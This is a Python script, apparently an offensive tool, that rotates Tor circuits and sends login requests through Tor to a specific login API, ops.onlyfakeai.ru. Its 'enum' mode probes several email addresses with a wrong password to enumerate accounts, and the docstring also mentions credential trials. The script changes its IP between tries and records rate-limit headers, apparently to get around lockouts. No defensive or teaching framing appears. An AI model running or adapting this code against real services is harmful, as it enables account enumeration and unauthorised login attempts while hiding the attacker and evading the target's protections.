#!/usr/bin/env python3
"""Tor circuit rotation + ops login probe (email enumeration / credential trials)."""
import socket, subprocess, time, json, sys, os, hashlib

CTRL = ("127.0.0.1", 9051)
COOKIE = "/tmp/tordata/control_auth_cookie"
SOCKS = "socks5-hostname://127.0.0.1:9050"
TARGET = "https://ops.onlyfakeai.ru/api/auth/login"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0 Safari/537.36"


def ctrl(cmd: bytes) -> bytes:
    s = socket.create_connection(CTRL, timeout=10)
    cookie = open(COOKIE, "rb").read()
    s.sendall(b"AUTHENTICATE " + cookie.hex().encode() + b"\r\n")
    time.sleep(0.15)
    s.recv(256)
    s.sendall(cmd + b"\r\n")
    time.sleep(0.2)
    try:
        return s.recv(1024)
    finally:
        s.close()


def new_circuit(wait=2.5):
    ctrl(b"SIGNAL NEWNYM")
    time.sleep(wait)


def login(email: str, password: str, timeout=40):
    t0 = time.time()
    p = subprocess.run(
        [
            "curl", "-sS", "-k", "--socks5-hostname", "127.0.0.1:9050",
            "-m", str(timeout), "-A", UA, "-X", "POST",
            "-H", "Content-Type: application/json",
            "-d", json.dumps({"email": email, "password": password}),
            "-o", "/tmp/login_body.bin", "-D", "/tmp/login_hdr.txt",
            "-w", "%{http_code}",
            TARGET,
        ],
        capture_output=True, text=True,
    )
    code = p.stdout.strip()
    try:
        body = open("/tmp/login_body.bin", "rb").read(400).decode("utf-8", "replace")
    except Exception:
        body = ""
    hdrs = {}
    try:
        for line in open("/tmp/login_hdr.txt", encoding="utf-8", errors="ignore"):
            if ":" in line:
                k, v = line.split(":", 1)
                hdrs[k.strip().lower()] = v.strip()
    except Exception:
        pass
    return {"code": code, "body": body, "dt": round(time.time() - t0, 2),
            "remaining": hdrs.get("ratelimit-remaining"), "reset": hdrs.get("ratelimit-reset"),
            "retry_after": hdrs.get("retry-after")}


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "enum"
    if mode == "enum":
        emails = ["onlyfake@tuta.io", "admin@onlyfakeai.ru", "nosuchuser@example.com"]
        for e in emails:
            new_circuit()
            r = login(e, "definitely-wrong-pass-4080")
            print(json.dumps({"email": e, **r}), flush=True)
            time.sleep(1)
